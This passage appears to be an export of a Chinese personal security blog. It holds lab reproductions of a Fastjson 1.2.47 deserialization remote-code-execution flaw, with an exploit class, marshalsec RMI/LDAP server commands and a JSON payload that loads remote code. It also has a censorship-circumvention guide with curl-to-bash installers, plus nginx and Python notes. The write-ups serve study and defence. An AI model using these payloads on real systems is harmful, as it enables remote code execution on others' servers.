class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mybatis.controller;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * &lt;h3&gt;mybatis2&lt;/h3&gt;</span><br><span class="hljs-comment"> * &lt;p&gt;&lt;/p&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : zhuxinkai</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : 2020-07-07 15:32</span><br><span class="hljs-comment"> **/</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SystemTest</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br><br>        setValue();<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setValue</span><span class="hljs-params">()</span> </span>&#123;<br><br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>       <br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br><br>    &#125;<br>  <br><br><br>&#125;<br><br></code></pre></td></tr></table></figure>然后在spring boot 实现的REST API中执行下这个设置方法。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-meta">@PostMapping(value = &quot;/rest&quot;,</span><br><span class="hljs-meta">        consumes = &quot;application/json;charset=UTF-8&quot;,</span><br><span class="hljs-meta">        produces = &quot;application/json;charset=UTF-8&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">rest</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String person)</span> </span>&#123;<br><span class="hljs-comment">//利用  System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;) 改变两个默认值，进行测试。</span><br><span class="hljs-comment">//  System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br>SystemTest.setValue();<br><br>String data = person;<br><span class="hljs-comment">//System.out.println(person);</span><br>    JSONObject obj = JSON.parseObject(person);<br>    System.out.println(obj);<br>    <span class="hljs-keyword">return</span> obj;<br><br></code></pre></td></tr></table></figure>通过相关的设置，发现8u181版本的jdk也可以正常执行rmi远程程序。所以可以证明，确实是这两个值增强了相应的安全设置。然而，这两个值是默认为false的，所以，相应的利用方式需要换一个姿势。<h1 id="对接LDAP服务-JNDI-Reference-Payload"><a href="#对接LDAP服务-JNDI-Reference-Payload" class="headerlink" title="对接LDAP服务 + JNDI Reference Payload"></a>对接LDAP服务 + JNDI Reference Payload</h1><p>这个利用方式受限于  com.sun.jndi.ldap.object.trustURLCodebase，相应的利用方式直到2018年10月才修复。<br>在Oracle JDK 11.0.1、8u191、7u201、6u211之前，都可以使用这种方式进行执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">java -cp marshalsec-<span class="hljs-number">0.0</span><span class="hljs-number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="hljs-string">&quot;http://192.168.0.119:8888/Exploit/#TouchFile&quot;</span> <span class="hljs-number">9999</span><br><br></code></pre></td></tr></table></figure><p>利用marshalsec ,建立LDAP服务器监听端。这次我本地的jdk版本是8u181 版本的直接可以利用成功。<br><a href="https://www.buhuixiu.com/images/fastjson-2-2.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/fastjson-2-2.png"></a><br><a href="https://www.buhuixiu.com/images/jdk-by-ldap.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/jdk-by-ldap.png"></a></p><p><a href="https://www.buhuixiu.com/images/fastjson-2-3.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/fastjson-2-3.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Fastjson 相关安全漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastjson vulnerable poc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于科学上网</title>
      <link href="/2020/07/06/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
      <url>/2020/07/06/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="警告：-本文仅用于个人学习使用，技术讨论。通过本网页进行的非法活动，将不承担任何责任。"><a href="#警告：-本文仅用于个人学习使用，技术讨论。通过本网页进行的非法活动，将不承担任何责任。" class="headerlink" title="警告： 本文仅用于个人学习使用，技术讨论。通过本网页进行的非法活动，将不承担任何责任。"></a>警告： 本文仅用于个人学习使用，技术讨论。通过本网页进行的非法活动，将不承担任何责任。<h4 id="1-1-关于翻墙的历史："><a href="#1-1-关于翻墙的历史：" class="headerlink" title="1.1 关于翻墙的历史："></a>1.1 关于翻墙的历史：</h4><p>  翻墙的历史，需要追溯到2008年。谷歌退出中国大陆，YouTube以隐私为理由拒绝配合中国政府提供新疆恐怖袭击人员的相关计划及个人信息。同时考虑到</p><h3 id="1-2-翻墙方式："><a href="#1-2-翻墙方式：" class="headerlink" title="1.2 翻墙方式："></a>1.2 翻墙方式：</h3><h4 id="1-2-1-VPN"><a href="#1-2-1-VPN" class="headerlink" title="1.2.1 VPN :"></a>1.2.1 VPN :</h4><h5 id="1-2-1-1-卡巴斯基vpn"><a href="#1-2-1-1-卡巴斯基vpn" class="headerlink" title="1.2.1.1 卡巴斯基vpn"></a>1.2.1.1 卡巴斯基vpn</h5><p>. 登录账号： 300M每天。 不登陆 200M 优点：可以看4K，速度跑起来压力比较小。。可以上到10K Kbps上的速度，但是流量马上用完，，毕竟只有200-300M</p><h5 id="1-2-1-2-Hotspot-VPN-热盾）"><a href="#1-2-1-2-Hotspot-VPN-热盾）" class="headerlink" title="1.2.1.2 Hotspot VPN(热盾）"></a>1.2.1.2 Hotspot VPN(热盾）</h5><p>免费 500M流量  付费 3美元每月  相对比较慢，轻量级使用可以满足。</p><h5 id="1-2-1-3-Hideme"><a href="#1-2-1-3-Hideme" class="headerlink" title="1.2.1.3 Hideme"></a>1.2.1.3 Hideme</h5><p>稳定性较差，连接需要几次。速度可以排第二。每月是10GB的流量，可以播放1080P, 5-8k kbps的速度。也可以上10K kbps，可以播放4K.</p><h5 id="1-2-1-4-VPN总结"><a href="#1-2-1-4-VPN总结" class="headerlink" title="1.2.1.4 VPN总结"></a>1.2.1.4 VPN总结</h5><p>以前  翻墙 === VPN ，但是目前，VPN似乎已经是过时的一种技术手段。 目前 v2ray , trojan, SS,SSR 这些流量加密方式和<br>流量伪装技术，比VPN的管道技术，似乎更被 GFW 所喜欢。<br>   VPN毕竟是被大公司玩的，需要ISP的介入。当然你也可以从二级供应商那里获取相应的服务。</p><h4 id="1-2-2-v2ray"><a href="#1-2-2-v2ray" class="headerlink" title="1.2.2 v2ray"></a>1.2.2 v2ray</h4><p>v2ray（tcp)  + bbr plus or + 锐速  .<br>v2ray (websocket + tls) + bbr plus or + 锐步。<br>            <a href="https://github.com/233boy/v2ray/wiki/V2Ray%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC">https://github.com/233boy/v2ray/wiki/V2Ray%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC</a><br>            bash &lt;(curl -s -L <a href="https://git.io/v2ray.sh">https://git.io/v2ray.sh</a>)</p><span id="more"></span><h4 id="1-2-3-trojan"><a href="#1-2-3-trojan" class="headerlink" title="1.2.3 trojan"></a>1.2.3 trojan</h4><p><strong>trojan</strong>是近两年兴起的网络工具，项目官网<a href="https://github.com/**trojan**-gfw%E3%80%82">https://github.com/**trojan**-gfw。</a> 与强调加密和混淆的SS/SSR等工具不同，<strong>trojan</strong>将通信流量伪装成互联网上最常见的https流量，从而有效防止流量被检测和干扰。 在敏感时期，基本上只有<strong>trojan</strong>和v2ray伪装 能提供稳如狗的体验。<br>   trojan官网地址  <a href="https://trojan-gfw.github.io/trojan/">https://trojan-gfw.github.io/trojan/</a></p><pre><code>   bash &lt;(curl -s -L https://github.com/V2RaySSR/Trojan/raw/master/Trojan.sh)   wget -N --no-check-certificate &quot;https://raw.githubusercontent.com/V2RaySSR/Trojan_Panel/master/trojan_panel.sh&quot; &amp;&amp; chmod +x trojan_panel.sh &amp;&amp; ./trojan_panel.sh</code></pre><h6 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h6><pre><code>        We’ll only cover the build process on Linux since we will be providing Windows and macOS binaries. Building trojan on every platform is similar.        Dependencies        Install these dependencies before you build (note that the test has some additional dependencies):        CMake &gt;= 3.7.2        Boost &gt;= 1.66.0        OpenSSL &gt;= 1.1.0        libmysqlclient        For Debian users, run sudo apt -y install build-essential cmake libboost-system-dev libboost-program-options-dev libssl-dev default-libmysqlclient-dev to install all the necessary dependencies.        Clone        Type in        git clone https://github.com/trojan-gfw/trojan.git        cd trojan/        to clone the project and go into the directory.        Build and Install        Type in        mkdir build        cd build/        cmake ..        make        ctest        sudo make install        to build, test, and install trojan. If everything goes well you’ll be able to use trojan.        </code></pre><h4 id="1-2-4-shadowsocks"><a href="#1-2-4-shadowsocks" class="headerlink" title="1.2.4 shadowsocks"></a>1.2.4 shadowsocks</h4><p> AEAD加密。<br> shadowsocks 协议在定位方面，特征过滤方面，可能已经被GFW定位得比较准确。所以，使用这个协议得服务器，一般被封杀得比较严重。<br> shadowsocks RTT最短，握手最快。大都数机场依然得主要协议方式。</p><h3 id="1-3-翻墙安全"><a href="#1-3-翻墙安全" class="headerlink" title="1.3 翻墙安全"></a>1.3 翻墙安全</h3><p> 妄图通过协议，或者跳转，或者其他乱起八糟的方式，想完全逃脱GFW的监控是不可能的。相应的，只不过是你未达到一个阈值另外是<br> 大多数机场的狡兔三窟策略方式。 AI和大数据分析，已经让我们无所遁形。<br> 不要提供翻墙技术。不要商业化翻墙服务（大机场的人员估计都不在国内）。不要去国外的帖子上面发表反政府，反中国共产党言论。（毕竟中国提供了稳定的发展环境，不要吃着家人的奶，还去别人家里骂娘。有本事在自己家里骂，硬杠。）</p><h3 id="1-4-可靠性，可用性。"><a href="#1-4-可靠性，可用性。" class="headerlink" title="1.4 可靠性，可用性。"></a>1.4 可靠性，可用性。</h3><p> 我们家是移动100M宽带。很多人抱怨移动网络翻墙很坑。。。事实上也是如此。。使用同一台服务器（香港 -谷歌云VPS-延迟30-50)，连接家里得100M 和连接到我得联通4G流量，结果100M移动，明显的拥塞控制，早上100M移动的4K高清，可以跑到80M，牛吧。但是，在晚上，却少于1M。逼得我，只能使用联通4G，使用联通4G可以跑到3-5M左右。可以看到，ISP的国际出口方面，根本不是受GFW影响，根本就是ISP的国际出口不够，或者是因为你跑的现路优先级不够。所以，在这里，大型机场的优势就出来了，他们是买了BGP线路的人。相应的服务和应急措施还是跟得上，比你买国外服务器自己搭建服务器，可以突破国际出口，QOS， 限速等等的限制。<br> 当然，如果你是电信的宽带，200M或者以上，那这方面对你的限制会显得小很多。<br> 我对比了下，trojan 和 v2ray vmess方式。速度相差无几。</p><h5 id="可靠性："><a href="#可靠性：" class="headerlink" title="可靠性："></a>可靠性：</h5><p>不知道是否GFW放松了管控，目前的断网情况比去年要好很多。去年在世博会，进博会， 政协会议，这个会那个会期间，很多shadowsocks的服务器都不能用了。今年，我买的机场， 跑V2ray VMESS的目前，没有出现所有服务器都不能用的情况。很愉快的在上网。</p><h3 id="1-5-科学上网干什么？"><a href="#1-5-科学上网干什么？" class="headerlink" title="1.5 科学上网干什么？"></a>1.5 科学上网干什么？</h3><pre><code>60%的用户仅pron,我也是分子。但是，这个东西丰简由人，身体要紧。NETFIX的账户需要60港币一个月。youtube 的广告比较烦人。但是内容值得看，比国内哪些看多了会脑残的视频平台好了N多个等级，B站除外。BBC也是很政治色瓷浓郁的一个地方，当然比国内还是要好些的。学点英语。。 youtobe  TED演讲</code></pre><p><a href="%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200607220759.jpg" title="node更换路径" class="gallery-item"><img src="/2020/07/06/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200607220759.jpg" alt="node更换路径"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> v2ray </tag>
            
            <tag> ssr </tag>
            
            <tag> bbrplus </tag>
            
            <tag> trojan </tag>
            
            <tag> wbsocket + ssl </tag>
            
            <tag> 翻墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python遍历字典</title>
      <link href="/2020/07/04/python%E9%81%8D%E5%8E%86%E5%AD%97%E5%85%B8/"/>
      <url>/2020/07/04/python%E9%81%8D%E5%8E%86%E5%AD%97%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p><a href="https://www.buhuixiu.com/images/tutorial-on-how-to-use-comments-in-python.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/tutorial-on-how-to-use-comments-in-python.png"></a><p></p><h1 id="1-像遍历序列一样，可以使用普通的for语句"><a href="#1-像遍历序列一样，可以使用普通的for语句" class="headerlink" title="1,像遍历序列一样，可以使用普通的for语句"></a>1,像遍历序列一样，可以使用普通的for语句</h1><p><a href="https://www.buhuixiu.com/images/iteration-dict.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/iteration-dict.png"></a></p><h1 id="2-d-items-以元组的方式返回键-值对。"><a href="#2-d-items-以元组的方式返回键-值对。" class="headerlink" title="2,d.items 以元组的方式返回键-值对。"></a>2,d.items 以元组的方式返回键-值对。</h1><p><a href="https://www.buhuixiu.com/images/interation-dict2.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/interation-dict2.png"></a></p><h1 id="3-关于逻辑判断的一些缺失点。"><a href="#3-关于逻辑判断的一些缺失点。" class="headerlink" title="3,关于逻辑判断的一些缺失点。"></a>3,关于逻辑判断的一些缺失点。</h1><p><a href="https://www.buhuixiu.com/images/%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD%E9%97%AE%E9%A2%98.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD%E9%97%AE%E9%A2%98.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Nginx搭建简单的图片服务器</title>
      <link href="/2020/07/02/%E5%88%A9%E7%94%A8Nginx%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BE%E7%89%87%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/07/02/%E5%88%A9%E7%94%A8Nginx%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BE%E7%89%87%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="安装nginx-这里就略过了。"><a href="#安装nginx-这里就略过了。" class="headerlink" title="安装nginx 这里就略过了。"></a>安装nginx 这里就略过了。<h1 id="安装vsftp"><a href="#安装vsftp" class="headerlink" title="安装vsftp"></a>安装vsftp</h1><p>安装vsftp 主要用于上传图片，其实这个可以适用Xmanager 的xftp ,或者适用WinSCP来完美解决。便捷，方便，迅速，可视化强。<br>或者直接适用rz命令，这是我最喜欢使用的。当然很多linux 服务器需要安装下。</p><h1 id="开始搭建Nginx-图片服务器"><a href="#开始搭建Nginx-图片服务器" class="headerlink" title="开始搭建Nginx 图片服务器"></a>开始搭建Nginx 图片服务器</h1><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><a href="https://www.buhuixiu.com/images/%E6%95%88%E6%9E%9C.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/%E6%95%88%E6%9E%9C.png"></a></p><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="需要再nginx-html-下创建一个images文件夹-（实际访问的不是这个路径）"><a href="#需要再nginx-html-下创建一个images文件夹-（实际访问的不是这个路径）" class="headerlink" title="需要再nginx/html 下创建一个images文件夹 （实际访问的不是这个路径）"></a>需要再nginx/html 下创建一个images文件夹 （实际访问的不是这个路径）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir /usr/local/nginx/html/images<br></code></pre></td></tr></table></figure><h3 id="修改nginx-conf-nginx-conf-在默认的server里再添加一个location并指定实际路径："><a href="#修改nginx-conf-nginx-conf-在默认的server里再添加一个location并指定实际路径：" class="headerlink" title="修改nginx/conf/nginx.conf 在默认的server里再添加一个location并指定实际路径："></a>修改nginx/conf/nginx.conf 在默认的server里再添加一个location并指定实际路径：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">location /images/&#123;<br>    root /usr/local/;<br>    autoindex on;<br><br>    &#125; <br></code></pre></td></tr></table></figure><h3 id="重启nginx"><a href="#重启nginx" class="headerlink" title="重启nginx"></a>重启nginx</h3><h3 id="将图片放置在具体的物理路径-usr-local-images-下"><a href="#将图片放置在具体的物理路径-usr-local-images-下" class="headerlink" title="将图片放置在具体的物理路径 /usr/local/images/下"></a>将图片放置在具体的物理路径 /usr/local/images/下</h3><h1 id="说明及注意事项，我在第4点饶了好久。"><a href="#说明及注意事项，我在第4点饶了好久。" class="headerlink" title="说明及注意事项，我在第4点饶了好久。"></a>说明及注意事项，我在第4点饶了好久。</h1><p>1)root则是将images映射到/usr/local/images/<br>2)autoindex on便是打开索引功能。不然无法建立有效的浏览索引。。如果是单纯的html访问，则可以指定html为索引类型。　<br>3)很多人用vsftpd上传图片，所有会新建用户，更改文件夹的权限等，在这里因为是采用rz方式上传，所以无需做更改权限处理。<br>4)root /usr/local 这后面是不带images的且root后面要有空格。local目录下有images目录，用于存放图片!</p><h1 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h1><p>这种方式的优点在于快捷和迅速。使用起来很方便。适合于静态部署图片服务器。<br>缺点在于，如果是要接入到WEB应用系统，实现图片文件的动态上传，审核，重新建立索引，重命名文件，类型限制等或者作为大型的图片服务器等，可能需要借助于fastdfs,等专门的图片服务器来实现。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson 1.2.47 远程命令执行漏洞</title>
      <link href="/2020/06/30/Fastjson-1-2-47-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/06/30/Fastjson-1-2-47-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞<p><a href="https://p403.ssl.qhimgs4.com/t0195606c8e40d8435f.png" class="gallery-item"><img src="https://p403.ssl.qhimgs4.com/t0195606c8e40d8435f.png"></a></p><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.4利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955">https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955</a></li><li><a href="https://www.freebuf.com/vuls/208339.html">https://www.freebuf.com/vuls/208339.html</a></li></ul><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>这里可以用spring boot搭建一个简单的web项目，也可以去github上下载一个相关的dokcer项目。<br>我这边是下载了github上的vulhub项目的内容。相关的内容也是参考readme.md写的。<br>项目地址在<a herf="https://github.com/zhuxinkai/vulhub">这是我的fork地址，源地址自己搜索下</a><br>执行如下命令启动一个spring web项目，其中使用fastjson作为默认json解析器：<br>安装docker ,和docker compose 请查看我的两外两篇文章。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose up -d<br></code></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8090</code>即可看到一个json对象被返回，<br>后面我们要将content-type修改为<code>application/json</code>，将GET改为POST将相关的payload发送给后端，后端接到后通过fastjson的解析，造成<br>相关的远程命令执行。这次测试的远程命令是在/tmp下新建 success文件。</p><span id="more"></span><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。<br>(目前大部分的jdk 都是8u181 版本，尝试自己建立一个环境试下）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// javac TouchFile.java</span><br><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TouchFile</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime rt = Runtime.getRuntime();<br>            String[] commands = &#123;<span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;/tmp/success&quot;</span>&#125;;<br>            Process pc = rt.exec(commands);<br>            pc.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// do nothing</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="将上面的代码通过javac-编译成TouchFile-class文件。-将编译后的文件，放到web容器中。-我这里放在了tomcat中）这个class包含了后面需要具体执行的攻击命令（代码）。"><a href="#将上面的代码通过javac-编译成TouchFile-class文件。-将编译后的文件，放到web容器中。-我这里放在了tomcat中）这个class包含了后面需要具体执行的攻击命令（代码）。" class="headerlink" title="将上面的代码通过javac 编译成TouchFile.class文件。 将编译后的文件，放到web容器中。(我这里放在了tomcat中）这个class包含了后面需要具体执行的攻击命令（代码）。"></a>将上面的代码通过javac 编译成TouchFile.class文件。 将编译后的文件，放到web容器中。(我这里放在了tomcat中）这个class包含了后面需要具体执行的攻击命令（代码）。</h5><p><a href="https://www.buhuixiu.com/images/classpath.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/classpath.png"></a></p><p>然后我们借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：<br>(自己下载项目然后，maven 打包成jar包。）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://你放置.class的路径/#TouchFile&quot; 9999<br></code></pre></td></tr></table></figure><h5 id="上面这条在windows服务器没有跑成功，发送payload之后，没有数据连接过来。。但是在centos-8上顺利执行，并看到效果了。具体原因没有去细究。"><a href="#上面这条在windows服务器没有跑成功，发送payload之后，没有数据连接过来。。但是在centos-8上顺利执行，并看到效果了。具体原因没有去细究。" class="headerlink" title="上面这条在windows服务器没有跑成功，发送payload之后，没有数据连接过来。。但是在centos 8上顺利执行，并看到效果了。具体原因没有去细究。"></a>上面这条在windows服务器没有跑成功，发送payload之后，没有数据连接过来。。但是在centos 8上顺利执行，并看到效果了。具体原因没有去细究。</h5><p><a href="https://www.buhuixiu.com/images/lisetenlog.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/lisetenlog.png"></a></p><p>向靶场服务器发送Payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-attr">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://启动监听器的服务器:9999/Exploit&quot;</span>,<br>        <span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.buhuixiu.com/images/success.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/success.png"></a></p><p>下图可见，在目标服务器上命令<code>touch /tmp/success</code>已成功执行：<br><a href="https://www.buhuixiu.com/images/serverside.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/serverside.png"></a></p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>fastjson 1.2.47 相关的修复，从应用端来说就是升级相关的版本到最新。。至于fastjson源代码是如何修复的，后面再补充。</p><h1 id="防御-阿里WAF"><a href="#防御-阿里WAF" class="headerlink" title="防御-阿里WAF"></a>防御-阿里WAF</h1><p>关于防御方面，阿里WAF的解释是通过相关POST参数过滤来实现。。我测试了下，直接就把@type类型的数据给拦截掉了。<br><a href="https://www.buhuixiu.com/images/阿里WAF2.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/阿里WAF2.png"></a><br><a href="https://www.buhuixiu.com/images/阿里waf1.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/阿里waf1.png"></a><br><a href="https://www.buhuixiu.com/images/waf3.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/waf3.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Fastjson 相关安全漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastjson vulnerable poc </tag>
            
